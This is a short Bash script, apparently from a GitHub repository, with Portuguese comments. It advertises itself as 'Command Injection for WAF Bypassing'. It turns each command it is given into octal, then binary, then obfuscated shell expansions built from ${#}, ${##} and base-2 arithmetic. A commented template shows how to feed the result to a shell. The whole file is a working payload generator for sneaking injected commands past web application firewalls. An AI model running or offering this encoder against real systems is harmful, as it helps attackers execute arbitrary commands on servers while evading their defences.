#!/usr/bin/env bash

[[ -z "$*" ]]&& echo -e "\nUso:\n ${0##/} c o m a n d o" # for now you'll have to separate the characters with a space

echo -e "\n - Injeção de Comando para bypassar WAF / Command Injection for WAF Bypassing\n   Github: RodricBr"

for ARG_ in "$@"; do
  #ARG_=$(echo "$ARG_" | sed 's/./& /g') # teste
  DECIMAL_=$(echo -n "$ARG_" | od -t o1 -A n | tr -d ' ')
  #echo -e "Comando: $ARG_\nDecimal: $DECIMAL_" #$INDEX = $ARG_"
  printf "\nComando: %s\nDecimal: %s\n" "$ARG_" "$DECIMAL_"
  BINARIO=$(bc <<< "obase=2;$DECIMAL_")
  echo -e "Binário: $BINARIO"
  FINAL_=$(echo "$BINARIO" | sed 's/0/\$\{\#\}/g; s/1/\$\{\#\#\}/g')
  echo "Produto final Encodado: $FINAL_"
  echo "Produto final: \\\\\$((\$((1<<1))#$BINARIO))"
  INTEIRO_+="$ARG_"; echo "$INTEIRO_"
  echo "-----------------------------------------------------"
  # ${0##-}<<<\$\'COMANDO AQUI DENTRO\'
  #let "INDEX+=1"
done
